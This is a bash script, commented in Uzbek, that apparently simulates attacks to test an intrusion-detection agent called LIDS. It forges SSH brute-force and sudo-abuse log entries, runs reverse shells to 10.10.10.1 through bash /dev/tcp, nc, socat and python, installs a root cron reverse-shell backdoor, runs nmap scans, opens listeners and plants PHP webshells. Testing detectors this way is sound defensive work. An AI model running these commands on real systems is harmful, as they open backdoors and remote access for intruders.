#!/bin/bash
# ─────────────────────────────────────────────
#   LIDS - Attack Simulator
#   LIDS agentini test qilish uchun
#   FAQAT O'Z MASHINANGIZDA ISHLATING!
# ─────────────────────────────────────────────

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
BOLD='\033[1m'
NC='\033[0m'

PASS=0
FAIL=0
AUTH_LOG="/var/log/auth.log"
[ ! -f "$AUTH_LOG" ] && AUTH_LOG="/var/log/syslog"

ok()   { echo -e "  ${GREEN}✓${NC}  $1"; ((PASS++)); }
fail() { echo -e "  ${RED}✗${NC}  $1"; ((FAIL++)); }
info() { echo -e "  ${BLUE}›${NC}  $1"; }
sep()  { echo ""; echo -e "  ${YELLOW}────────────────────────────────────────${NC}"; }
head() { sep; echo -e "  ${BOLD}$1${NC}"; sep; }

cleanup() {
    rm -f /tmp/evil_test /tmp/.hidden_evil /tmp/.x11_cache /tmp/lids_test_cron 2>/dev/null
    rm -f /dev/shm/test_payload /dev/shm/.daemon 2>/dev/null
    rm -f /etc/cron.d/lids_test_backdoor 2>/dev/null
    kill $NC_PID1 $NC_PID2 $NC_PID3 2>/dev/null || true
}
trap cleanup EXIT

clear
echo ""
echo -e "${RED}${BOLD}"
echo "     ██╗     ██╗██████╗ ███████╗"
echo "     ██║     ██║██╔══██╗██╔════╝"
echo "     ██║     ██║██║  ██║███████╗"
echo "     ██║     ██║██║  ██║╚════██║"
echo "     ███████╗██║██████╔╝███████║"
echo "     ╚══════╝╚═╝╚═════╝ ╚══════╝"
echo -e "${NC}"
echo -e "  ${BOLD}Attack Simulator — To'liq Test${NC}"
echo -e "  ${RED}⚠️  FAQAT O'Z MASHINANGIZDA ISHLATING!${NC}"
echo -e "  ${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

[[ $EUID -ne 0 ]] && echo -e "${RED}[!] Root kerak: sudo bash attack.sh${NC}" && exit 1

if ! systemctl is-active --quiet lids 2>/dev/null; then
    echo -e "  ${YELLOW}⚠  LIDS ishlamayapti — avval: sudo bash install.sh${NC}"
    echo ""
fi

echo -e "  ${CYAN}Telegram da alertlarni kuting...${NC}"
sleep 1

# ══════════════════════════════════════════════
# 1. SSH BRUTE FORCE — intensiv
# ══════════════════════════════════════════════
head "1/6  SSH Brute Force"

FAKE_IP1="203.0.113.$(shuf -i 10-250 -n 1)"
FAKE_IP2="185.220.$(shuf -i 100-200 -n 1).$(shuf -i 1-254 -n 1)"
FAKE_IP3="45.33.$(shuf -i 1-254 -n 1).$(shuf -i 1-254 -n 1)"

info "IP 1: $FAKE_IP1 — 15 ta urinish (root, admin, ubuntu)"
for i in $(seq 1 15); do
    USER=$(shuf -e root admin ubuntu pi vagrant oracle -n 1)
    echo "$(date '+%b %d %H:%M:%S') $(hostname) sshd[$$]: Failed password for $USER from $FAKE_IP1 port $((RANDOM+1024)) ssh2" >> $AUTH_LOG
done
ok "IP1 brute force yozildi"

info "IP 2: $FAKE_IP2 — 10 ta urinish"
for i in $(seq 1 10); do
    echo "$(date '+%b %d %H:%M:%S') $(hostname) sshd[$$]: Failed password for invalid user $(shuf -e hacker test guest admin123 -n 1) from $FAKE_IP2 port $((RANDOM+1024)) ssh2" >> $AUTH_LOG
done
ok "IP2 brute force yozildi"

info "IP 3: $FAKE_IP3 — root login muvaffaqiyatli!"
echo "$(date '+%b %d %H:%M:%S') $(hostname) sshd[$$]: Accepted password for root from $FAKE_IP3 port $((RANDOM+1024)) ssh2" >> $AUTH_LOG
ok "Root login yozildi ($FAKE_IP3)"

info "Sudo abuse yozuvlari..."
for CMD in "/bin/bash" "/usr/bin/python3 -c import os;os.system('/bin/bash')" "/bin/sh -p"; do
    echo "$(date '+%b %d %H:%M:%S') $(hostname) sudo[$$]: hacker1337 : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=$CMD" >> $AUTH_LOG
done
ok "Sudo abuse yozildi"

sleep 2

# ══════════════════════════════════════════════
# 2. REVERSE SHELL — bir necha usul
# ══════════════════════════════════════════════
head "2/6  Reverse Shell Simulation"

info "bash /dev/tcp usuli..."
bash -c 'bash -i >& /dev/tcp/10.10.10.1/4444 0>&1' &>/dev/null &
RSPID1=$!
ok "bash reverse shell process (PID: $RSPID1)"
sleep 1; kill $RSPID1 2>/dev/null || true

info "python socket usuli..."
python3 -c "
import socket,subprocess,os
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('10.10.10.1',4445))
except: pass
" &>/dev/null &
RSPID2=$!
ok "python reverse shell process (PID: $RSPID2)"
sleep 1; kill $RSPID2 2>/dev/null || true

info "nc -e usuli..."
if command -v nc &>/dev/null; then
    nc -e /bin/bash 10.10.10.1 4446 &>/dev/null &
    RSPID3=$!
    ok "nc reverse shell process (PID: $RSPID3)"
    sleep 1; kill $RSPID3 2>/dev/null || true
else
    fail "nc topilmadi"
fi

info "socat usuli..."
if command -v socat &>/dev/null; then
    socat TCP:10.10.10.1:4447 EXEC:/bin/bash &>/dev/null &
    RSPID4=$!
    ok "socat reverse shell process (PID: $RSPID4)"
    sleep 1; kill $RSPID4 2>/dev/null || true
else
    info "socat o'rnatilmagan — o'tkazib yuborildi"
fi

sleep 2

# ══════════════════════════════════════════════
# 3. SUSPICIOUS PROCESSES — /tmp executables
# ══════════════════════════════════════════════
head "3/6  Suspicious Processes & /tmp Files"

info "/tmp/evil_test yaratilmoqda..."
echo -e '#!/bin/bash\nwhile true; do sleep 1; done' > /tmp/evil_test
chmod +x /tmp/evil_test
/tmp/evil_test &>/dev/null &
EVPID=$!
ok "/tmp/evil_test ishga tushdi (PID: $EVPID)"

info "/tmp/.hidden_evil (yashirin)..."
echo -e '#!/bin/bash\necho hidden' > /tmp/.hidden_evil
chmod +x /tmp/.hidden_evil
ok "/tmp/.hidden_evil yaratildi"

info "/dev/shm/.daemon (RAM da yashirin)..."
echo -e '#!/bin/bash\nsleep 999' > /dev/shm/.daemon
chmod +x /dev/shm/.daemon
/dev/shm/.daemon &>/dev/null &
DMPID=$!
ok "/dev/shm/.daemon ishga tushdi (PID: $DMPID)"

info "/dev/shm/test_payload..."
echo "shellcode_payload_here" > /dev/shm/test_payload
chmod +x /dev/shm/test_payload
ok "/dev/shm/test_payload yaratildi"

info "Cron backdoor yaratilmoqda..."
echo "* * * * * root bash -i >& /dev/tcp/10.10.10.1/4444 0>&1 #lids_test" > /etc/cron.d/lids_test_backdoor
ok "/etc/cron.d/lids_test_backdoor yaratildi"

sleep 2

# ══════════════════════════════════════════════
# 4. PORT SCAN — nmap o'ziga
# ══════════════════════════════════════════════
head "4/6  Port Scan (nmap)"

if command -v nmap &>/dev/null; then
    info "nmap localhost sken (SYN scan)..."
    nmap -sS -p 1-1000 127.0.0.1 &>/dev/null &
    NMPID=$!
    ok "nmap SYN scan boshlandi (PID: $NMPID)"

    info "nmap version scan..."
    nmap -sV -p 22,80,443,8080 127.0.0.1 &>/dev/null &
    ok "nmap version scan boshlandi"

    wait $NMPID 2>/dev/null || true
    ok "Port scan tugadi"
else
    fail "nmap topilmadi — o'tkazib yuborildi"
    info "O'rnatish: sudo apt install nmap"
fi

# ══════════════════════════════════════════════
# 5. NOODATIY PORTLAR
# ══════════════════════════════════════════════
head "5/6  Noodatiy Portlar"

for PORT in 31337 4444 1337; do
    if command -v ncat &>/dev/null; then
        ncat -l $PORT &>/dev/null &
    elif command -v nc &>/dev/null; then
        nc -l -p $PORT &>/dev/null &
    fi
    PID=$!
    eval "NC_PID$((PORT==31337?1:PORT==4444?2:3))=$PID"
    ok "Port $PORT ochildi (hacker port) — PID: $PID"
    sleep 0.5
done

sleep 3

# ══════════════════════════════════════════════
# 6. WEBSHELL SIMULATION
# ══════════════════════════════════════════════
head "6/6  Webshell Simulation"

for WEBROOT in /var/www/html /srv/http /usr/share/nginx/html; do
    if [ -d "$WEBROOT" ]; then
        info "Webshell yaratilmoqda: $WEBROOT/test_shell.php"
        echo '<?php system($_GET["cmd"]); ?>' > "$WEBROOT/test_shell.php"
        ok "Webshell: $WEBROOT/test_shell.php"

        echo '<?php eval(base64_decode($_POST["payload"])); ?>' > "$WEBROOT/.hidden_shell.php"
        ok "Yashirin webshell: $WEBROOT/.hidden_shell.php"
        break
    fi
done

if [ ! -d "/var/www/html" ] && [ ! -d "/srv/http" ] && [ ! -d "/usr/share/nginx/html" ]; then
    info "Web root topilmadi — webshell testi o'tkazib yuborildi"
fi

# ══════════════════════════════════════════════
# NATIJA
# ══════════════════════════════════════════════
echo ""
echo -e "  ${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "  ${BOLD}Test Natijalari${NC}"
echo -e "  ${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "  ${GREEN}✓  Muvaffaqiyatli:${NC}      ${BOLD}$PASS${NC} ta"
echo -e "  ${RED}✗  O'tkazib yuborildi:${NC}  ${BOLD}$FAIL${NC} ta"
echo ""
echo -e "  ${BOLD}Tekshiring:${NC}"
echo -e "  ${CYAN}→ Telegram da alertlar kelishi kerak${NC}"
echo -e "  ${CYAN}→ sudo journalctl -u lids -f${NC}"
echo ""
echo -e "  ${BOLD}Tozalash:${NC}"
echo -e "  ${CYAN}sudo bash attack.sh --clean${NC}"
echo ""
echo -e "  ${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

# --clean flag
if [[ "$1" == "--clean" ]]; then
    echo -e "  ${YELLOW}Tozalanmoqda...${NC}"
    rm -f /tmp/evil_test /tmp/.hidden_evil /tmp/.x11_cache
    rm -f /dev/shm/test_payload /dev/shm/.daemon
    rm -f /etc/cron.d/lids_test_backdoor
    rm -f /var/www/html/test_shell.php /var/www/html/.hidden_shell.php 2>/dev/null
    rm -f /srv/http/test_shell.php /usr/share/nginx/html/test_shell.php 2>/dev/null
    echo -e "  ${GREEN}✓  Tozalandi!${NC}"
    echo ""
    exit 0
fi

# ══════════════════════════════════════════════
# LIDS ni restart qilib logni ko'rsatish
# ══════════════════════════════════════════════
echo -e "  ${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "  ${BOLD}LIDS Agent tekshirilmoqda...${NC}"
echo -e "  ${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

if systemctl is-active --quiet lids 2>/dev/null; then
    echo -e "  ${BLUE}›${NC}  LIDS restart qilinmoqda..."
    systemctl restart lids
    sleep 3
    echo -e "  ${GREEN}✓${NC}  LIDS qayta ishga tushdi"
    echo ""
    echo -e "  ${BOLD}So'nggi loglar:${NC}"
    echo -e "  ${YELLOW}────────────────────────────────────────${NC}"
    journalctl -u lids -n 20 --no-pager | grep -v "^--" | tail -20
    echo -e "  ${YELLOW}────────────────────────────────────────${NC}"
    echo ""
    echo -e "  ${CYAN}Real-vaqt loglar uchun:${NC}"
    echo -e "  ${CYAN}sudo journalctl -u lids -f${NC}"
else
    echo -e "  ${YELLOW}⚠  LIDS ishlamayapti — avval: sudo bash install.sh${NC}"
fi
echo ""
echo -e "  ${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "  ${CYAN}Telegram da alertlarni tekshiring!${NC}"
echo -e "  ${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo